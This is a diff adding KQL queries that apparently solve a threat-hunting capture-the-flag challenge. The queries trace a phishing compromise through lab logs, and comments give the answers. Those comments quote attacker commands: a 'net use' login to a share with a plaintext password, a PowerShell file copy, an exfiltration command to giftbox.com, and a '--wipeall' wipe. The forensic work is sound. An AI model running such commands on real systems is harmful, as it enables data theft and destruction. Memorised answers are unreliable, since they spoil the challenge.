@@ -1,0 +1,144 @@
+////////////////////
+// CASE 1 - Alert //
+////////////////////
+// the alerts says the user clicked the malicious link
+// 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+
+// Email of receipient?
+Email
+| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+// alabaster_snowball@santaworkshopgeeseislands.org
+
+// Email of sender?
+Email
+| where link == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+// cwombley@gmail.com
+
+
+//////////////////////////
+// CASE 2 - Got phished //
+//////////////////////////
+// what is the role, hostname, source ip of the victim?
+Employees
+| where email_addr =='alabaster_snowball@santaworkshopgeeseislands.org'
+| project role, hostname, ip_addr
+// Head Elf, Y1US-DESKTOP, 10.10.0.4
+
+
+/////////////////////
+// CASE 3 - After? //
+/////////////////////
+// At what time was the malicious link clicked?
+SecurityAlerts
+| take 10
+
+OutboundNetworkEvents
+| where url=='http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+// 2023-12-02T10:12:42Z
+
+ProcessEvents
+| where  timestamp >= datetime('2023-12-02T10:12:42Z')
+| where hostname =='Y1US-DESKTOP'
+| order by timestamp asc
+
+//What file is dropped to Alabaster's machine shortly after he downloads the malicious file?
+
+OutboundNetworkEvents // InboundNetworkEvents
+| where timestamp >= datetime('2023-12-02T10:12:42Z') and src_ip =='10.10.0.4'
+| order by timestamp asc
+
+FileCreationEvents
+| where timestamp >= datetime('2023-12-02T10:12:42Z') and hostname =='Y1US-DESKTOP'
+| order by timestamp asc
+//giftwrap.exe
+
+
+///////////////////////
+// CASE 4 - The Host //
+///////////////////////
+// The attacker created an reverse tunnel connection with the compromised machine.
+// What IP was the connection forwarded to?
+let dt = toscalar(OutboundNetworkEvents
+| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+| project timestamp);
+ProcessEvents
+| where timestamp >= todatetime(dt) and hostname =='Y1US-DESKTOP'
+| where  process_commandline has 'forward'
+// 113.37.9.17
+
+
+// What is the timestamp when the attackers enumerated network shares on the machine?
+let dt = toscalar(OutboundNetworkEvents
+| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+| project timestamp);
+ProcessEvents
+| where timestamp >= todatetime(dt) and hostname =='Y1US-DESKTOP'
+| where  process_commandline has 'share'
+// 2023-12-02T16:51:44Z
+
+
+// What was the hostname of the system the attacker moved laterally to?
+let dt = toscalar(OutboundNetworkEvents
+| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+| project timestamp);
+ProcessEvents
+| where timestamp >= todatetime(dt) and hostname =='Y1US-DESKTOP'
+| where parent_process_hash == "614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f"
+| where * has @'\\'
+// cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
+
+
+
+//////////////////////////
+// CASE 5 - The Message //
+//////////////////////////
+// When was the attacker's first base64 encoded PowerShell
+// command executed on Alabaster's machine?
+let dt = toscalar(OutboundNetworkEvents
+| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+| project timestamp);
+ProcessEvents
+| where timestamp >= todatetime(dt) and hostname =='Y1US-DESKTOP'
+| where parent_process_name == 'cmd.exe' and process_commandline has 'powershell'
+| top 1 by timestamp asc
+// 2023-12-24T16:07:47Z
+
+// What was the name of the file the attacker copied from the fileshare? 
+// (This might require some additional decoding)
+let dt = toscalar(OutboundNetworkEvents
+| where url == 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+| project timestamp);
+ProcessEvents
+| where timestamp >= todatetime(dt) and hostname =='Y1US-DESKTOP'
+| where parent_process_name == 'cmd.exe' and process_commandline has 'powershell'
+| parse-where process_commandline with @'C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc ' msg
+| extend decoded = base64_decode_tostring(msg)
+| project timestamp, decoded
+
+txt.tsiLeciNythguaN
+NaughtyNiceList.txt
+
+let t=@"( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''";
+print t=reverse(t)
+
+
+// The attacker has likely exfiltrated data from the file share. 
+// What domain name was the data exfiltrated to?
+// The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?
+// giftbox.com
+// 100, 111, 119, 110, 119, 105, 116, 104, 115, 97, 110, 116, 97, 46, 101, 120, 101, 32, 45, 101, 120, 102, 105, 108, 32, 67, 58, 92, 92, 68, 101, 115, 107, 116, 111, 112, 92, 92, 78, 97, 117, 103, 104, 116, 78, 105, 99, 101, 76, 105, 115, 116, 46, 100, 111, 99, 120, 32, 92, 92, 103, 105, 102, 116, 98, 111, 120, 46, 99, 111, 109, 92, 102, 105, 108, 101
+// Decimal to ASCII
+// downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
+
+
+////////////////////////
+// CASE 6 - The Final //
+////////////////////////
+// What was the executable & flag in final command?
+// C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
+
+//////////////
+// Congrats //
+//////////////
+print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
+// Beware the Cube that Wombles
